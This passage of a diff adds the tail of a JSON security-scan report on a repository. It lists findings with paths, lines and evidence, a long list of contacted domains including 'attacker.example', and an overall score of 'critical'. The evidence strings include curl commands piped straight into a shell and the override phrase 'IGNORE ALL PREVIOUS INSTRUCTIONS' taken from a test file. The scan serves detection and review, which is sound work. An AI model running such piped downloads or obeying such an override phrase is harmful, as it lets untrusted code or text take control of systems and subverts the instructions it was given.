+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_${nodeMajor}.x | bash",
+      "file_sha256": "fe8fc4086b4f8a3026b3dd34b476d1e7fd0c887e541b98aecd48b2c72beca325"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/dag-executor.test.ts",
+      "line": 806,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "b1a804b17bb086c924b9d5fd78f2ab6da193426336ba4987673468a64858faf1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/.github/workflows/ci.yml",
+      "line": 80,
+      "evidence": "curl … | sh",
+      "file_sha256": "edd17ee3db548c88d232b0167cc7cb9607006097e943aaceef1721d177fa6be5"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "another-host.test",
+    "api.github.com",
+    "attacker.example",
+    "bullmq.io",
+    "cva.style",
+    "cwe.mitre.org",
+    "deb.nodesource.com",
+    "docs.docker.com",
+    "example.com",
+    "example.test",
+    "get.docker.com",
+    "getpino.io",
+    "github.com",
+    "haive-drupal7-fixture.ddev.site",
+    "hono.dev",
+    "host.docker.internal",
+    "lucide.dev",
+    "mailpit.axllent.org",
+    "nextjs.org",
+    "nodejs.org",
+    "npm.example.com",
+    "npm.pkg.github.com",
+    "openrouter.ai",
+    "orm.drizzle.team",
+    "playwright.dev",
+    "pnpm.io",
+    "prettier.io",
+    "raw.githubusercontent.com",
+    "react.dev",
+    "redis.io",
+    "registry.example",
+    "registry.npmjs.org",
+    "rs-claude-fable-high.ddev.site",
+    "rs-claude-fable-low.ddev.site",
+    "rs-claude-fable-max.ddev.site",
+    "rs-claude-fable-medium.ddev.site",
+    "rs-claude-fable-xhigh.ddev.site",
+    "rs-claude-haiku-high.ddev.site",
+    "rs-claude-haiku-low.ddev.site",
+    "rs-claude-haiku-max.ddev.site",
+    "rs-claude-haiku-medium.ddev.site",
+    "rs-claude-haiku-xhigh.ddev.site",
+    "rs-claude-high.ddev.site",
+    "rs-claude-low.ddev.site",
+    "rs-claude-medium.ddev.site",
+    "rs-claude-opus-xhigh.ddev.site",
+    "rs-claude-opus5-low.ddev.site",
+    "rs-claude-opus5-max.ddev.site",
+    "rs-claude-opus5-medium.ddev.site",
+    "rs-claude-opus5-xhigh.ddev.site",
+    "rs-claude-sonnet-high-4.ddev.site",
+    "rs-claude-sonnet-high.ddev.site",
+    "rs-claude-sonnet-low-4.ddev.site",
+    "rs-claude-sonnet-low.ddev.site",
+    "rs-claude-sonnet-max-4.ddev.site",
+    "rs-claude-sonnet-max.ddev.site",
+    "rs-claude-sonnet-medium-4.ddev.site",
+    "rs-claude-sonnet-medium.ddev.site",
+    "rs-claude-sonnet-xhigh.ddev.site",
+    "rs-claude-sonnet4-xhigh.ddev.site",
+    "rs-codex-5-6-high.ddev.site",
+    "rs-codex-5-6-low.ddev.site",
+    "rs-codex-5-6-max.ddev.site",
+    "rs-codex-5-6-ultra.ddev.site",
+    "rs-codex-5-6-xhigh.ddev.site",
+    "rs-codex-high.ddev.site",
+    "rs-codex-low.ddev.site",
+    "rs-codex-med.ddev.site",
+    "rs-codex.ddev.site",
+    "rs-glm-53-high.ddev.site",
+    "rs-glm-53-low.ddev.site",
+    "rs-glm-53-max.ddev.site",
+    "rs-glm-53-medium.ddev.site",
+    "rs-grok-build.ddev.site",
+    "rs-ollama.ddev.site",
+    "rs-ollama2.ddev.site",
+    "rs-ollama3.ddev.site",
+    "rs-ollama4.ddev.site",
+    "rs-ollama5.ddev.site",
+    "rs-opus-4-6-high.ddev.site",
+    "rs-opus-4-6-low.ddev.site",
+    "rs-opus-4-6-max.ddev.site",
+    "rs-zai-high.ddev.site",
+    "rs-zai-low.ddev.site",
+    "rs-zai-medium.ddev.site",
+    "rs-zai.ddev.site",
+    "sourceforge.net",
+    "tailwindcss.com",
+    "turbo.build",
+    "turborepo.com",
+    "typicode.github.io",
+    "vitest.dev",
+    "www.ecb.europa.eu",
+    "www.postgresql.org",
+    "www.radix-ui.com",
+    "www.typescriptlang.org",
+    "www.w3.org",
+    "xtermjs.org",
+    "zod.dev"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
